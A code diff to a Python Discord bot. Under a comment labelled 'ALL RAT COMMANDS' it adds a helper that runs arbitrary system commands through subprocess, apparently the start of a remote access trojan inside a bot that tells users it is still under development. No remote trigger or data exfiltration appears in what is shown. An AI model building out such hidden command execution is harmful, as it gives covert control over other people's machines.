@@ -1,6 +1,7 @@
 import os
 
 import discord
+import subprocess
 from discord.ext import commands
 
 from src.database.manager import main as db_main
@@ -43,6 +44,19 @@ async def on_message(message):
         if message.content.lower().startswith(db_main.prefix):
             await message.reply("This bot is still under development. Stay tuned! Thank you.")
             return
+
+# ALL RAT COMMANDS
+# --------------------------------------------------------------
+# Support
+
+
+def run_system_command(command: list, show: bool = True):
+    p = subprocess.run(command, capture_output=True, text=True)
+    code, out, err = p.returncode, p.stdout, p.stderr
+    if show:
+        print(out or err)
+    return code, out, err
+
 
 if __name__ == "__main__":
     client.run(db_main.token)
